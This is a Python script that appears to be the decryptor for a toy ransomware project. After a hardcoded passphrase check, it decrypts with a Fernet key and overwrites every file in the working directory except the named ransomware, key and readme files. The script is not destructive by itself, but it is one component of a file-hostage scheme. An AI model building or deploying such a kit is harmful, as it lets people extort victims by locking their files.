import os
from cryptography.fernet import Fernet

# Load the encryption key
with open('thekey.key', 'rb') as key_file:
    secret_key = key_file.read()

# Collect all target files
files = []
for file in os.listdir():
    if file in ['random_ency.py', 'ransome_ware.py', 'thekey.key', 'decry.py', 'readme.txt']:
        continue
    if os.path.isfile(file):
        files.append(file)

# Ask for decryption password
secret_phrase = 'king'
user_input = input("Enter the key to decrypt your files:\n")

if user_input == secret_phrase:
    for file in files:
        with open(file, 'rb') as thefile:
            contents = thefile.read()

        try:
            decrypted_content = Fernet(secret_key).decrypt(contents)
            with open(file, 'wb') as thefile:
                thefile.write(decrypted_content)
            print(f"[+] {file} decrypted successfully.")
        except Exception as e:
            print(f"[!] Failed to decrypt {file}: {e}")

    print("\n🎉 Congratulations! Your files have been decrypted.")
else:
    print("\n[!] Incorrect key. Decryption failed.")
